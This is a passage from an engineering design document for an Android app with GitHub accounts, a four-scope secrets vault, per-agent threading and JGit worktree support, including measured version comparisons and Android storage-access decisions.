- **Entering an account shows its projects** — the existing project screen, unchanged.
- **Leaving it** (back) returns to the account list.
- **`activeLogin` becomes "the account you are inside"**, set on enter, cleared on leave. It is
  *derived from navigation*, never chosen from a picker up front.
- **`+` on the accounts screen** adds an account (sign-in) and removes one. **Settings loses its account
  block**, because the accounts screen is now the place accounts live.

#### What this costs — and what it saves

| place | change |
|---|---|
| `MainActivity` | one new screen state: `account: String?` null = the list; non-null = that account's projects |
| `BrowserScreen` | the projects screen takes the account it is showing rather than reading `activeLogin` |
| `SettingsScreen` | **the account block is deleted** — sign-in, switch and remove move to the accounts screen |
| `AppViewModel` | `activeLogin` gains `enterAccount(login)` / `leaveAccount()`; the project list stays per-account |
| `AccountStore` | **no change** — `accounts()` already lists them |

**Saved:** the cross-account `ProjectRef` type, the union scan, the ~102 signatures question, and the
multi-runner agent. **`Workspace.projectNames()` keeps listing one account's folders**, which is what it
already does.

**This is strictly less work than the flat list**, and the reason is the agent: one runner, one
workspace, one active account was already true, and the folder model preserves it instead of fighting
it.

**Why the account cannot simply be dropped.** A repository is pushed as an identity, and the commit
author is a person. So each project must remember which account it belongs to:

- the **push credential** (whose token)
- the **commit author** (name and email)
- the **remote URL's owner**, which is usually that account

That is a project fact. Today it is implied by "whichever account is selected", which is why selecting
one is necessary at all.

**What "a list of added accounts" means:** `AccountStore.accounts()` already returns every added
account. Today it feeds a picker; it will feed a **screen** — add, remove, see which projects each one
holds. The accounts themselves, their tokens and their author details do not change.

### 13c.3 The identity key — dissolved by the folder model

**With accounts as folders, a project never needs to carry its account.** You are inside one account at
a time, so `Workspace.projectDir(name)` is unambiguous: the workspace you hold *is* that account's. The
`ProjectRef(account, name)` type, the union scan and the 102-signature question **all disappear**.

**What remains is one rule:** any action that outlives the screen must name its account, because
`activeLogin` can change while it runs. Measured, that is **fewer places than it sounds**:

| place | why it must name the account |
|---|---|
| `tickAgents` / `AgentRunner` | already holds one `Workspace`; **nothing to change** |
| the agent service | already per-account via the runner |
| a background job whose result lands after a leave | the `Background` result file is under a project folder, which is already account-relative |
| account deletion | names its own login already |

**So there is no refactor here at all** — the folder model means the ambiguity the flat list created
never arises.

<details>
<summary>The flat-list version of this section, kept because the reasoning is reusable</summary>

**Every project is addressed by `(account, name)`.** The menu shows `account/name` where it matters and
`name` where it does not.

**Project names can collide across accounts** — `acme-site` on two accounts is two different
repositories. So a bare name is ambiguous the moment a second account exists, and the ambiguity must be
resolved where the project is *chosen*, not where it is used.

#### The options, and the costs

| option | what it costs |
|---|---|
| **A. `ProjectRef(account, name)` everywhere** | ~100 signatures change (`grep "project: String"` finds 102 across 23 files), plus every call site and every test fixture. **Type-safe**: the compiler finds every one. |
| **B. Flatten to `"account/name"` strings** | No signature changes, and it looks cheap — but `Workspace.projectDir` joins with `File`, so a `/` becomes a nested folder, and **a project named `a/b` would escape or collide**. Every `File(projectDir, …)` becomes a parse. The cheapness is an illusion and the failure is silent. |
| **C. One active account at a time, switched by opening a project** | Smallest diff: keep `activeLogin`, but set it *from* the chosen project instead of from a picker. The menu is the union; opening a project re-binds the workspace. |

**Decision: A, and C as the mechanism that makes it cheap.**

`activeLogin` stays — as **the account of the project you are in**, derived from the project rather than
chosen up front. So `Workspace`, `ProjectGit`, `AgentTools` and the 102 `project: String` signatures are
**untouched**: they keep meaning "this account's project", and the account is set correctly before they
are called. What changes is **where the menu's list comes from** — a scan across accounts — and **where
`activeLogin` is set** — when a project is opened, not from a picker.

That is one new data type at the edge (`ProjectRef`) and a list that spans accounts, rather than a
refactor of the whole tree. **The 102 signatures are the thing to avoid touching, and this avoids them.**

</details>

#### What it costs

| place | change |
|---|---|
| `AppViewModel` | a `projects` list of `ProjectRef` scanned from every account; `projectNames` becomes the current account's view of it; opening a project sets `activeLogin` |
| `ProjectList` / `BrowserScreen` | rows show the account; the "no projects" state spans accounts |
| add-project dialogs | one account selector, defaulting to the last used |
| `AccountStore` | no change — `accounts()` already lists them |
| deletion | must name the account, because the folder is under it |

**No migration.** Project folders stay where they are; the account is already the parent folder.

### 13c.4 The vault: **four** scopes — app / general / account / project

**The operator's refinement:** *"this way we can add account secret scope between general and project,
this way we dont need to remove account secret scope but just add general scope."*

**Adopted, and it is better than what this section said before.** The earlier draft *replaced* the
account scope with `general`, which would have thrown away a distinction that costs nothing to keep.
**`general` is added; `account` stays.**

| scope | key shape | who can read it | why |
|---|---|---|---|
| **app** | `token_$login`, `modelKeyKey(login)` | the app only | A **separate namespace**, so `http {auth:}` can never reach a token. Structural, and it stays. |
| **general** | `secret_general_$name` | **every agent, every project, every account** | A key shared across accounts — a service the whole app talks to |
| **account** | `secret_${login}_$name` | every agent under **this account** | A key that belongs to one person's GitHub identity, shared by their projects but not by someone else's |
| **project** | `secret_${login}_project_${project}_$name` | agents in **this project only** | A key that belongs to one project |

**The four are genuinely different questions**, and each is a real case:

- *general* — the same `stripe` key for every project the app has, whichever account made them
- *account* — a client's key that belongs to one GitHub identity; a second account must not see it
- *project* — one project's token, which should not be readable from a sibling

**Keeping `account` costs nothing** because §13b.8's key shape is already built and shipped this session.
The only new key shape is `secret_general_$name`.

**The project key keeps its `project` marker and its login**, exactly as built — so `secret_${login}_x`
(account) and `secret_${login}_project_${project}_x` (project) cannot collide, which was the reason the
literal `project` segment exists.

#### Resolution order — narrowest first

`http {auth: "x"}` asks **project → account → general**:

1. `secret_${login}_project_${project}_x` — this project, this account
2. `secret_${login}_x` — this account
3. `secret_general_x` — everything
4. none → the refusal names **all three** places it looked, so a person knows which scope to add it to

**Narrowest wins, and each step is a deliberate shadow**: a project that needs a different key for the
same service says so without renaming; an account that needs a different key from the general one says
so without touching every project.

**Why not project-then-general, skipping account?** Because then an account-scoped secret could never
override a general one, and a person with two accounts would have no way to say "this account's key, not
the shared one" — the case the operator is preserving by keeping the scope.

**A note on the `account` scope that the folder model makes sharper:** with accounts as folders, the
account scope is exactly "the secrets of the account you are inside" — which is a coherent thing to show
on that account's screen.

#### Migration: **there is none**, and that is now literally true

**No secret of any scope exists yet.** The project scope landed this session (`c36b68c`) and nothing
has been stored under it; the general scope is new. **The account scope is unchanged** — same key shape,
same meaning — so keeping it is what makes this section empty.

The only work is **adding** `secret_general_$name` and a fourth row in the window. There is nothing to
re-key, nothing to offer a person at startup, and no "found under the old scope" prompt — which the
earlier draft needed only because it was renaming a scope that had no reason to be renamed.

### 13c.5 The order, revised

**13c lands before §13b.10's step 5**, because both touch the same key shapes and doing 13b.8 first
means writing keys that 13c then renames.

| # | Step | Why here |
|---|---|---|
| 1 | Vault: add the `general` scope, four-scope resolution order | Pure addition; the three existing scopes are untouched |
| 2 | **The accounts screen**: the main menu becomes the account list, `+` adds and removes, entering shows that account's projects | The visible change, and it is navigation only |
| 3 | **Delete the account block from Settings** | Follows from 2 — it is the block 2 replaces |
| 4 | `activeLogin` becomes "the account you entered": `enterAccount` / `leaveAccount` | The mechanism under 2; small and testable on its own |
| 5 | The secrets window gains its fourth scope row and selector | Last, because it shows all four and the screens above decide which is default |

**The agent is untouched by 13c**, which is the point: `AgentRunner` already holds one `Workspace`, and
the folder model keeps that true. Nothing about `AgentTools`, `Agent`, `AgentWiring` or the 102
`project: String` signatures changes.

**What the earlier draft would have cost, for the record:** a `ProjectRef` type at the menu edge, a scan
across every account on every refresh, and — the expensive part — **the agent needing to run every
account's projects at once**, which means N runners and N WebViews. The folder model asks none of that.


### 13c.6 Several projects' agents at once — measured, and it is already safe

**The operator's question:** *"will it be problematic to keep agents from several projects working at
the same time?"*

**No, and it is what happens today.** Measured, in `AgentRunner.kt`:

| fact | where | what it means |
|---|---|---|
| **one `Workspace`** | `AgentRunner.kt:24` | a runner is one account's — this is why accounts-as-folders costs nothing |
| **`tick()` loops every session** | `AgentRunner.kt` `for (session in sessions.read())` | several projects **are** woken in one tick |
| **`worker = newSingleThreadExecutor()`** | `AgentRunner.kt:158` | …and they run **one at a time**, in order |
| **`inFlight` is a set of agent ids** | `AgentRunner.kt:171` | per-agent, not global — the design already allows more than one |
| **`RepoLocks`** | `RepoLocks.kt` | git writes are serialised **per repository**, shared by the editor, the sync and every agent |

So the answer has three parts, and only one of them is a real constraint:

#### 1. It is already happening, within an account

`tick()` iterates every session in the account and wakes each one that is due. The thing that stops
three simultaneous requests is **not** a limit of one project — it is `newSingleThreadExecutor()`.

#### 2. Serial is a decision, and the comment already states the trade

`AgentRunner.kt:140` — *"serial is easier to manage, predictable and simple"* — with the two costs that
would otherwise be paid:

- **Three projects due is three requests in flight**, and a ping's whole point is buying warmth cheaply.
  Three at once is three times the bill for the same warmth, and a phone doing three simultaneous
  completions gets hot.
- **Concurrency needs a queue policy that can be explained**: what happens when four are due, which goes
  first, whether a person's turn may jump a ping. Serial answers all of that by not asking it.

The cost is honest: **a ping on a slow model makes the next project wait.**

#### 3. What is *not* serialised, and why that matters here

- a **`background` call** gets its own thread (`Background.real`)
- a **turn from the screen** does not run on the runner's worker at all
- **git writes** are serialised per repository, not globally — so two projects committing at once do
  not wait on each other, and two agents in one project cannot corrupt an index

**So "several projects at once" is already the design.** The folder model does not add a project to the
set — it adds a *second account's* projects, and that is the only genuinely new thing.

#### The one real question the folder model raises

**Should a project under an account you are not inside be spending your tokens?**

With accounts as folders, `AgentRunner` holds one `Workspace`, so only the account you entered is
ticked. That is not a limitation to work around — **it is the right default**, and it is the reason the
folder model is cheaper than the flat list:

| model | agents running | cost |
|---|---|---|
| **flat list** (superseded) | every account's, all the time | N runners, N WebViews (`WebViewBrowser` is bound to one Looper thread for life — the code already calls two runners a compromise), and a bill for projects nobody is looking at |
| **accounts as folders** (adopted) | the account you entered | **one runner, exactly as today** |

**If cross-account concurrency is ever wanted**, the honest way is explicit: a per-account switch, or a
"run in background" mark on a project — not an accident of the menu showing everything. **Nothing in the
current design forecloses it**, because `inFlight` is already keyed per agent and `RepoLocks` per
repository; what would need deciding is the bill and the queue policy, and that is a person's decision,
not a menu's.

**Answer: no problem, nothing to build, and the folder model keeps it that way.**

#### Where tool commands actually run — the measured answer

**The operator's question:** *"is it currently fully sequential or sequential for one agent and parallel
across different agents/projects?"*

**Neither, exactly — and the distinction matters.** Measured:

| work | thread | parallel? |
|---|---|---|
| **a turn from the screen** (the person typed) | `AppViewModel.worker` — its **own** single-thread executor (`AppViewModel.kt:110`) | **runs beside** the runner's work |
| **a keepalive ping / a wake** | `AgentRunner.worker` — a **different** single-thread executor (`AgentRunner.kt:158`) | serialised **among themselves** |
| **the tool calls inside one turn** | the thread running that turn | **strictly sequential** — `for (call in calls)` (`Agent.kt:749`, `:829`) |
| **a `background` call** | its own thread (`Background.real`) | parallel, by design |

**So the honest answer is: sequential within one agent's turn, and the screen's turn runs beside the
runner's pings.** The runner's own pings are serial across projects — that is the decision quoted above,
and it is about **model requests**, not about tools.

**There is no parallelism across projects for keepalive/wake work today.** Two projects due at the same
moment are handled one after the other, because they share `AgentRunner.worker`.

**But tool execution is not the thing that would block it.** The tools are fast — a file read, a commit,
a zip — and the time in a turn is overwhelmingly the **model request**. That is why the serial decision is
stated in terms of the bill and the battery rather than in terms of the disk.

#### Running across every project and account, with model requests in parallel

**Yes, and it is a small change, because the pieces are already keyed correctly:**

| what would need to change | today | what it becomes |
|---|---|---|
| `AgentRunner.worker` | `newSingleThreadExecutor()` | `newFixedThreadPool(N)` or a cached pool |
| `inFlight` | already a **set of agent ids** | **no change** — it already tracks more than one |
| `RepoLocks` | already **per repository** | **no change** — two projects never contend |
| `AgentTools` | one instance per `Agent`, per project | **no change** — nothing is shared between turns |
| the tick | `for (session in sessions.read())` | unchanged; the dispatch is already per session |

**What genuinely needs deciding, and it is a person's decision, not a code one:**

1. **The bill.** N parallel pings is N times the cost of the same warmth. The comment at
   `AgentRunner.kt:140` names this as the reason serial was chosen.
2. **The queue policy.** What happens when six are due and the pool is four — which one waits, whether a
   person's turn may jump a ping.
3. **The phone.** Several simultaneous completions is heat and battery, which is the second reason.
4. **Across accounts**, `AgentRunner` holds **one** `Workspace` (`:24`), so cross-account work needs
   either one runner per account or the runner to hold a map. **That is the real cost**, and it is why
   accounts-as-folders keeps it out of scope: one runner, one account, exactly as today.

**So the shape of the change is `newSingleThreadExecutor()` → a pool, plus a per-account runner if
accounts are to run together.** The concurrency *machinery* already exists; what does not exist is a
decision about the bill and the queue.

#### "What is a pool? We need as many threads as there are active agents, don't we?"

**Yes — and the operator is right, which corrects what this section said above.**

**A pool** is a fixed set of worker threads that tasks are handed to. `newSingleThreadExecutor()` is a
pool of exactly one. `newFixedThreadPool(4)` is a pool of four, and a fifth task **waits in a queue**
until one frees up. That waiting is the whole point of a fixed pool: it bounds how much runs at once.

**Why a fixed pool would be the wrong shape here, measured:**

| fact | where | consequence |
|---|---|---|
| the model request is **blocking** `HttpURLConnection` | `Door.kt:5`, `OpenRouterAuth.kt:150` | a turn holds its thread for the whole completion — seconds to minutes |
| the wait is almost entirely **network** | — | the thread does **nothing** for most of its life except block on a socket |
| a turn is not CPU-bound | — | adding threads costs memory, not contention |
| **the app already does this** | `Background.kt:209` — `Thread(...)` per call | **a thread created for the work that exists is not a resource to reason about** — the file says so in its own comment |

**So the right shape is one thread per active agent, not a fixed pool.** A pool of four would mean the
fifth project's agent waits for a slot **even though nothing is contending** — it would be a limit that
buys nothing, because the bottleneck is somebody else's server, not this phone's CPU.

**The corrected design:**

| | today | becomes |
|---|---|---|
| `AgentRunner.worker` | `newSingleThreadExecutor()` | **one thread per due agent** — or `newCachedThreadPool()`, which is the same thing with reuse |
| `inFlight` | set of agent ids | **no change** — already per-agent |
| `RepoLocks` | per repository | **no change** |
| the tick | `for (session in sessions)` | dispatch each to its own thread instead of the shared one |

**What still has to be bounded, and this is the real answer to "how many":** the number of threads is
"as many as there are active agents", and **that number is bounded by the session list, which is bounded
by the projects that have their agent switched on**. A person with 40 projects and 40 agents on gets 40
threads — each mostly blocked on a socket, each costing a few hundred KB of stack. That is affordable,
and it is the honest cost of what was asked for.

**The bill is not capped by a setting either — the operator ruled it out, 2026-11-07:** *"we dont need
max in flight settings parameter - however many are active are active, user can stop them if he wants."*

So there is **no cap, no pool size, and nothing to configure**. The controls that already exist are the
ones that answer "this costs too much":

- **the per-session switch** — a person stops an agent, and `StopReason.BY_OPERATOR` is the one stop
  nothing restarts
- **the keepalive ceiling** — `warmDue` → false, so a quiet session stops being pinged (§13c.6)
- **the interval** — how often a session is pinged at all

**A fourth knob would be a second way to say what the switch already says**, and it would be a number
nobody could pick correctly. The operator's rule is the right one: however many are active are active.

**So: "a pool" was the wrong word, and the operator's instinct is the design.** One thread per active
agent, with a configurable cap for the bill rather than a fixed pool for a contention that does not
exist.

#### "Agents become stopped when they run out of idle time" — **this is not what happens**

**Measured, because it changes the argument:** the keepalive ceiling does **not** stop a session.

```
warmDue(...) = when {
    !keepAlive -> false                      // the switch is off
    state == State.STOPPED -> false          // already stopped
    forAt > 0 && from > 0 && at - from >= forAt -> false   // the ceiling: stop PINGING
    else -> at >= lastPollAt + every
}
```
`AgentSession.kt:269`

**The ceiling makes `warmDue` return false, so the session stops being *pinged*. It stays `IDLE` and
stays `running`.** `running = state != State.STOPPED` (`:214`), and the only four stop reasons are
`BY_OPERATOR`, `PIN_REFUSED`, `LOOP` and `ERROR` (`:119`) — **none of them is idleness.**

**So a session that has gone quiet is not stopped, it is idle** — and idle sessions are exactly what a
parallel tick would find. The operator's inference ("so it shouldn't be problematic") is **right about
the conclusion and wrong about the mechanism**: nothing is being switched off, so nothing has to be
switched back on.

**What this means for concurrency:** a pool would dispatch the same `tick()` over the same list of idle
sessions. **No state machine change, no restart path, no re-arming** — only "how many at a time" and
"who waits".

## 13d. Branches as worktrees — measured, and it is possible

**The operator's proposal, 2026-11-07:** tapping a project shows **its branches**; `+` adds and removes
them; tapping a branch enters **that branch's worktree**; an agent inside one works only on that branch,
so its pushes and pulls are tied to it (`local branch <> remote branch`); and the sync slot shows
**"merge"** on a non-`main` branch instead of "release", merging only when there are no conflicts and
otherwise leaving the worktree in the merging state for the agent to resolve.

**Answer: yes, and the parts are all either already built or verified below.** But it is not free, and
the costs are stated rather than glossed.

### 13d.0 The correction: JGit 6.10.1 cannot open a linked worktree, so §13d is on hold

**§13d.1's measurements were taken against the wrong jar.** The probes ran on
`org.eclipse.jgit-7.2.1.202505142326-r`, which was what `javap` found first in the Gradle
distribution — **the project builds against 6.10.1** (`app/build.gradle.kts:357`). Re-measured against
6.10.1, the picture is different in the way that matters.

**What 6.10.1 actually does**, on a worktree made by real `git` (`git worktree add ../wt1 -b feature`):

| probe | result |
|---|---|
| `findGitDir(wt).build()` | `getDirectory()` = `…/.git/worktrees/wt1` — **found correctly** |
| `getWorkTree()` | **throws `NoWorkTreeException`** — "bare repository has neither a working tree, nor an index" |
| `findGitDir(wt).setWorkTree(wt)` | `getBranch()` = `feature` — the private `HEAD` reads fine |
| `resolve("refs/heads/feature")` | **`null`** |
| `getRefDatabase().getRefsByPrefix("refs/")` | **`[]`** — empty |
| `Repository.getCommonDirectory()` | **does not exist** (arrives in 7.x) |
| `RepositoryBuilder.setIndexFile` | **does not exist** |

**The reason is one line of git's layout that 6.10.1 does not follow.** A worktree's private
`…/.git/worktrees/wt1/` contains `commondir` pointing at `../..`; that is how every ref and object is
reached. 6.10.1 uses a `RefDirectory` rooted at the *private* directory, finds no `refs/` there, and
therefore reports **zero refs and zero branches**. The worktree is not merely awkward — **it is empty**.

**Pointing at the common `.git` instead** (`setGitDir(common).setWorkTree(wt1)`) does read the refs
correctly — but its `getIndexFile()` is the **main worktree's index**, so it is a repository that would
commit into the wrong working tree. That is worse than not working.

**So §13d's conclusion was withdrawn at 6.10.1** — and the reason is worth keeping: *the API was
measured on a version the project did not use.* The lesson is the same shape as the one this project
keeps re-learning — **read the dependency, not a plausible copy of it.**

### 13d.0b The upgrade, measured: 7.8.1 makes worktrees work

**The operator asked whether JGit could be upgraded, then said "do the bump and measure".** Both
artifacts are now `7.8.1.202611041320-r` (core and `.lfs`, together — a mismatched pair fails at run
time through the LFS SPI, not at build time).

**Re-measured against 7.8.1, on the same worktree real `git` made:**

| probe | 6.10.1 | 7.8.1 |
|---|---|---|
| `findGitDir(wt)` → `getWorkTree()` | **throws** `NoWorkTreeException` | `…/wt1` ✅ |
| `getCommonDirectory()` | **absent** | `…/repo/.git` ✅ |
| `getIndexFile()` | absent | `…/worktrees/wt1/index` ✅ |
| `refs/heads/*` | **`[]`** | both branches ✅ |
| `resolve("refs/heads/feature")` | `null` | the commit ✅ |

**`findGitDir(wt).build()` alone is now enough** — no `setWorkTree` needed, because 7.x follows
`commondir`. That is the single line that was missing.

**Java 17 is not an obstacle, and was never the real question.** This app already compiles to
`VERSION_17` / `JVM_17`, so CI has been dexing major-61 bytecode on every build. Checked for the two
things that could still bite:

- **Records and Java 17 APIs**: 7.8.1's records live in `dfs`/`midx`, unreachable from
  `FileRepository`. **Zero** uses of `String.isBlank`, `List.of`, `Files.readString`, `Stream.toList`
  — nothing needing core-library desugaring.
- **Sealed classes**: 18, including `MergeResult.MergeStatus`, which this app uses
  (`GitService.kt:617`, `CONFLICTING`). The constant still exists in 7.8.1. R8 on sealed classes is a
  **build-time** failure if it happens — CI says so in six minutes, not a device mystery.

**What this restores**, both of which were reverted at 6.10.1:

- `RepoLocks` keys on `getCommonDirectory()`, so two worktrees of one repository are one lock.
- `LfsStore.dirOf` uses `getCommonDirectory()`, so LFS objects are shared across branches.

Both are proven by `RepoLocksTest`, whose worktree is written by hand in git's four-file format (no
`git` binary on Android) and which asserts JGit resolves that hand-written worktree to the shared
repository.

**The LFS network client is NOT obsolete, and this was measured rather than assumed.** The new
`LfsConnectionFactory$AuthCache` looks like a credential cache and is not one: it holds an
`ExpiringAction` — the batch response's own expiry — and the request still sets exactly three headers
(`Accept`, `Accept-Encoding`, `Content-Type`), with **no `Authorization` anywhere in the class's
constant pool**. Upstream `eclipse-jgit/jgit#11` is still open with no fix version. So the split
stands: JGit for the pointer format, the clean filter and the blob loader; `LfsClient` for the batch
API, because it is the only half that can send a token.

**What this leaves standing from §13d:**

- **`GitService.merge` already does merge-only-if-clean** (`:591`). That is true at 6.10.1 and is the
  one part of §13d that needs nothing from worktrees.
- **The branches screen is worth keeping and is already built** (`BranchesScreen`, `localBranches`,
  `createBranch`, `deleteBranch`). It lists and makes branches in *one* working tree. Checking a
  branch out switches that tree, which is what the app can do today.
- **The `RepoLocks` and `LfsStore` "common directory" fixes are reverted**, because the API they need
  does not exist. Both files say so, and point here.

**The options, when the operator wants branches-with-separate-working-copies:**

1. **Upgrade JGit to 7.x.** `getCommonDirectory()` then exists, and `RepoLocks`/`LfsStore` can be
   keyed correctly. **Still unproven**: 7.2.1's `getCommonDirectory()` was confirmed present, but a
   worktree's refs were not re-probed there, so this is the first thing to measure if it is chosen.
2. **Upgrade git itself on the device** — not possible; the app ships JGit.
3. **Keep one worktree and switch branches in it.** No new mechanism, and the branches screen already
   works. The cost is that two agents cannot work on two branches at once, which is the whole point of
   §13d — so this is a fallback, not the answer.
4. **Write the worktree bookkeeping by hand and make JGit see it.** Not available: the blocker is
   `RefDirectory` not following `commondir`, which is inside JGit and not something a caller can fix.

### 13d.1 What was measured, on this machine, with the app's own JGit

| question | answer | how |
|---|---|---|
| Can JGit **open** a worktree? | **Yes** | `FileRepositoryBuilder().setWorkTree(dir).findGitDir(dir)` on a real `git worktree` → `branch=feature`, `workTree=/tmp/wtprobe/feat`, `directory=/tmp/wtprobe/main/.git/worktrees/feat` |
| Can JGit **create** a worktree? | **No** | The 6.10/7.2 jars contain **zero** `WorktreeAddCommand`-style classes. Creation must be done another way (below). |
| Does a JGit **commit inside** a worktree stay on that branch? | **Yes** | Committed `only-feat.txt` inside the worktree → landed on `feature`; `git -C main status` stayed clean, main's `HEAD` unmoved |
| Does JGit **merge** work inside a worktree? | **Yes** | Merged main's commit into the worktree's branch → `Fast-forward`, the worktree's file updated, main's worktree untouched |
| Is the shared object store correct? | **Yes** | `getDirectory()` = the worktree's private dir, `getCommonDirectory()` = the shared `.git` |
| Is `info/exclude` shared? | **Yes** | One `main/.git/info/exclude`; the worktree's `.git` is a *file* pointing at `main/.git/worktrees/feat` |

### 13d.2 The four real costs

**1. JGit cannot create a worktree — so the app must write four things itself.**

A `git worktree add` produces, and this app would have to produce identically:

```
<worktree>/.git              a FILE: "gitdir: <common>/.git/worktrees/<id>"
<common>/.git/worktrees/<id>/HEAD
<common>/.git/worktrees/<id>/commondir       "../.."
<common>/.git/worktrees/<id>/gitdir          "<worktree>/.git"
```
plus the branch's `refs/heads/<name>` and the checkout. **JGit can do every step** — `RefUpdate` for the
branch, `DirCacheCheckout` for the tree — but "the app hand-writes git's own bookkeeping format" is a
standing liability: it must match git exactly, forever, or `git` itself will refuse the directory.

**Mitigation, and it is the honest one:** `git` the binary is **not** available on Android, so there is
no "just shell out". The format above is four small files and it is stable; the probe above shows JGit
accepting what git wrote, which is the compatibility direction that matters. **A test must create a
worktree with this code and then verify `git` (in CI, where it exists) accepts it** — that is the
falsification, and without it this is a guess.

**2. One repository, many worktrees — and the app's locks assume one folder.**

| hazard | today | what it needs |
|---|---|---|
| `RepoLocks` | keyed by **the directory** (`RepoLocks.kt:64`) | keyed by **`getCommonDirectory()`**, or two worktrees of one repo commit concurrently and one takes the other's `index.lock` — **exactly the bug `RepoLocks` was written to fix** |
| `LfsStore.dirOf` | `File(repo.directory, "lfs/objects")` — **per worktree** | `File(repo.commonDirectory, "lfs/objects")`, or each worktree gets a private LFS store and a picture checked out on one branch is a missing object on another |
| `.gitattributes` | written per project folder | **committed content, so per branch** — which is right, and means two branches can disagree about LFS. That is git's own behaviour, not a defect. |
| `agent/` (the record) | inside the project folder, in `info/exclude` | **`info/exclude` is shared**, so a worktree's `agent/` is excluded on every branch — which is what we want, but it means one `agent/` per worktree folder, not one per repo |

**3. The identity change is the largest part, and it is the same one §13c.3 dissolved.**

Today a project **is** a folder **is** a repository (`Workspace.projectDir`). A worktree breaks that:
`Workspace.projectDir(name)` must become "the worktree of (project, branch)", and **every one of the 102
`project: String` signatures** would need to know which branch it is in — `AgentTools`, `AgentLog`,
`AgentSessions`, `SemanticSearch`, the index, the request log, `Door`.

**The cheap way through, and it is the same trick as §13c.2:** `activeLogin` already means "the account
you are inside"; add **`activeBranch`** meaning "the branch you are inside". The workspace is
`accountDir/<project>/<branch>/`, and `activeBranch` is set on entering a branch — so the 102 signatures
keep meaning "the project I am in" and the branch is ambient, exactly as the account is.

**That works, and it costs one more dimension of ambient state.** The risk is the same one the account
scope had: a background job that outlives the screen must name its branch. `AgentRunner` holds one
`Workspace`, so it would need one per (account, project, branch) or an ambient branch — and **that is
where this design gets expensive**, because an agent's session is already keyed by project
(`AgentSessions.readOne(project, …)`).

**4. The merge button is the cheapest part, because it already exists.**

`GitService.merge` (`:591`) already: merges into the current branch, **does not commit on conflict**,
returns the conflicted paths, and says *"Read the file, choose what it should say, write it, then push."*
That is precisely the requested behaviour — **nothing new is needed for "merge only if no conflicts,
otherwise leave the worktree merging"**. The worktree is already left in the merging state because JGit
writes the markers and stops.

The button's rule is a **branch test**, not new machinery:

| branch you are on | the slot shows |
|---|---|
| `main` | **Publish…** (§13b.7) |
| anything else | **Merge into `main`** |

### 13d.3 What I think: yes, and here is the order that makes it safe

**The feature is coherent and the operator's framing is right** — a branch is a place an agent can work
without touching anybody else's work, and "merge only when clean, otherwise let the agent resolve" is
how git already behaves.

**But it is four features stacked, and shipping them together would be one commit nobody could review:**

| # | step | why this order |
|---|---|---|
| 1 | **`RepoLocks` → `getCommonDirectory()`; `LfsStore` → `commonDirectory`** | Two one-line changes that are **correct even with one worktree**, and the two that would corrupt a repository if forgotten. Do them first, alone. |
| 2 | **The branches screen** — list `refs/heads`, `+` to create from `main`, remove | Read-only against refs; no worktrees yet. A project still opens its single worktree. |
| 3 | **`activeBranch` + the worktree folder** — one worktree per branch, entered by tapping a row | The identity change; ambient, like the account |
| 4 | **Worktree creation** (the four files) + the CI test that `git` accepts it | The risky part, and it is testable in CI where `git` exists |
| 5 | **The merge/publish split in the sync slot** | Smallest; `GitService.merge` already does the work |

**What I would not do:** create worktrees in step 2, or put the merge button in before the branches
screen exists. Both would be building on a folder layout that has not been proven.

#### The decision, made

**The operator, 2026-11-07:** *"when you tap a project you are shown branch screen where you need to
select a branch (and main branch exists by default even for newly created projects)."*

**So there is no default worktree.** Tapping a project always shows its branches, and `main` is a row
like any other. That settles the question this section left open, and it has two consequences worth
stating:

- **`main` always exists, including for a project made a second ago.** It already does —
  `ProjectGit.init` sets `setInitialBranch("main")` (`GitService.kt:315`) — so a new project has one
  branch, one row, and nothing to create. **The empty case cannot happen**, which is why the branch
  screen needs no "make your first branch" state.
- **The project's file screen is one tap deeper**, and every scenario screenshot and tour step that
  assumed "tap project → files" now passes through the branch screen. **That is the real cost, and it is
  a test-and-screenshots cost, not a logic cost** — the existing `BrowserScreen` is unchanged; it simply
  is reached by choosing `main`.

**And it removes a class of bug**: with no default worktree there is no "which branch is the project
on" state to keep in sync with a branch list, because the branch you are in is chosen every time rather
than remembered. `activeBranch` is then purely "the branch you entered", the same shape as
`activeLogin`, and leaving a project clears it.

**The back path is therefore three levels**, and each is one gesture: files → branches → projects →
accounts.

## 13e. Downloads as a folder in the worktree — the measurements, and the one fact that decides it

**The operator's ask, 2026-11-07:** *"is it possible to display downloads folder as a gitignored folder
inside a file (worktree) screen? so that there are no upload/download/list tools and just a folder that
syncs on its own?"* and then *"maybe there is another folder that can be accessed without extra
permissions? isnt there a single allowed shared folder in android?"*

Both questions are answered by measurement below. **The short answer is yes to the first, and no to the
second** — and the "no" is what forces the design.

### 13e.1 There is no shared folder that is free in both directions

| folder | app writes with no permission | other apps can write | pickable by `ACTION_OPEN_DOCUMENT_TREE` |
|---|---|---|---|
| `/data/data/<pkg>/files/` (where projects are) | **yes** | no | n/a — not shared storage |
| `Android/data/<pkg>/files/` | yes | **no** | **blocked** |
| `Download/` (root) | no | yes | **blocked on Android 11+** |
| `Download/<sub>/` | no | yes | **yes** |
| `Documents/`, `Pictures/` | no | yes | yes |

**There is no cell that is "yes" in both of the first two columns.** Android 11 put `Download/`'s root
on the explicitly blocked list for the folder picker, so the one folder everybody knows cannot even be
granted; a **subfolder** of it can. That is the whole of the "isn't there one allowed folder" answer:
no, but there is a grantable subfolder.

### 13e.2 Why `trace.log` works, and why that is not evidence

**`trace.log` reaches Downloads because the app writes it**, not because Downloads is shared.
`DownloadsSink` inserts the `MediaStore` row itself, so it always owns that row — and it collides with a
real store behaviour doing so: a row inserted as `trace.log` with a text MIME type comes back as
`trace.log.txt`, because the store appends an extension for what the type says the file is. That is
recorded in `DownloadsSink.kt:255`.

**For a file another app wrote, the ownership rule reverses.** A plain `MediaStore` query without a
storage permission returns **only the app's own rows**, and `READ_EXTERNAL_STORAGE` no longer covers
non-media files on Android 13+. So a `MediaStore`-backed Downloads row would list the app's own traces
and **silently omit the screenshot the person just saved from Chrome**.

**That silence is the reason this section exists.** A row that says "there is nothing there" about a
file the person can see with their eyes is exactly the failure this codebase keeps removing — it is a
no-op that reports success. The first draft of this plan recommended `MediaStore`; asking whether it
would carry a file *between apps* is what showed the recommendation was wrong.

### 13e.3 The decision: one folder, `Download/Muffy/`, granted once, via SAF

**A `DocumentFile` tree, not a `MediaStore` cursor.** The person picks `Download/Muffy/` once (the root
is blocked, the subfolder is not), the grant is persisted, and from then on the app holds a real
`content://` tree that both it and other apps can write.

**It is shared both ways** — owner and other apps — which is what the operator wants, and it is why the
`MediaStore` gap disappears rather than being documented as a limitation.

**The cost, stated plainly:** SAF yields a `content://` tree, **not a `File`**. JGit, `withinProject`,
